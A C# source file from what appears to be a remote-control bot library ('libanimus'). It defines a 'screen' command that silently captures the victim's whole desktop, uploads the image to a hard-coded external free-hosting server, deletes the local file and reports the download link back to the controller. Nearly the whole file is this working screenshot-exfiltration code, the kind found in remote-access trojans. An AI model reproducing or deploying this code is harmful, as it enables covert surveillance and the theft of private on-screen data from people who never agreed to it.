using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Windows.Forms;
using libanimus.Networking;
using libgdi32 = libanimus.Native.Native;

namespace libanimus.Actions.Predefined
{
	public class ActionScreen : HostAction
	{
		const string UPLOAD_URI = "http://vbosnnet.5gbfree.com/images/upload.php";
		const string ACCESS_URI = "http://vbosnnet.5gbfree.com/images/upload";

		IUpstream src;
		string filename;
		WebClient client;

		public ActionScreen () : base ("screen") {
			client = new WebClient ();
			client.Proxy = new WebProxy ();
		}

		public override void Run (IUpstream source, params string[] args) {
			src = source;
			filename = string.Format ("animus{0}.jpg", Guid.NewGuid ().ToString ("N"));
			Size sz = Screen.PrimaryScreen.Bounds.Size;
			var hDesk = libgdi32.GetDesktopWindow ();
			var hSrce = libgdi32.GetWindowDC (hDesk);
			var hDest = libgdi32.CreateCompatibleDC (hSrce);
			var hBmp = libgdi32.CreateCompatibleBitmap (hSrce, sz.Width, sz.Height);
			var hOldBmp = libgdi32.SelectObject (hDest, hBmp);
			bool b = libgdi32.BitBlt (hDest, 0, 0, sz.Width, sz.Height, hSrce, 0, 0, (CopyPixelOperation)0x40cc0020);
			using (var bmp = Image.FromHbitmap (hBmp)) {
				libgdi32.SelectObject (hDest, hOldBmp);
				libgdi32.DeleteObject (hBmp);
				libgdi32.DeleteDC (hDest);
				libgdi32.ReleaseDC (hDesk, hSrce);
				bmp.Save (filename, ImageFormat.Jpeg);
			}
			client.Headers.Add ("Content-Type", "binary/octet-stream");
			client.UploadFileCompleted += UploadFileCompletedCallback;
			client.UploadFileAsync (new Uri (UPLOAD_URI), "POST", filename);
		}

		void UploadFileCompletedCallback (object sender, UploadFileCompletedEventArgs e) {
			client.UploadFileCompleted -= UploadFileCompletedCallback;
			File.Delete (filename);
			NetworkManager.Instance.Notify (src, "Upload completed!");
			NetworkManager.Instance.Notify (src, string.Format ("{0}/{1}", ACCESS_URI, filename));
		}

		static Bitmap ResizeImage(Image image, int width, int height) {
			var destRect = new Rectangle (0, 0, width, height);
			var destImage = new Bitmap (width, height);

			destImage.SetResolution (image.HorizontalResolution, image.VerticalResolution);

			using (var graphics = Graphics.FromImage(destImage)) {
				graphics.CompositingMode = CompositingMode.SourceCopy;
				graphics.CompositingQuality = CompositingQuality.HighQuality;
				graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics.SmoothingMode = SmoothingMode.HighQuality;
				graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;

				using (var wrapMode = new ImageAttributes ()) {
					wrapMode.SetWrapMode (WrapMode.TileFlipXY);
					graphics.DrawImage (image, destRect, 0, 0, image.Width,image.Height, GraphicsUnit.Pixel, wrapMode);
				}
			}

			return destImage;
		}
	}
}

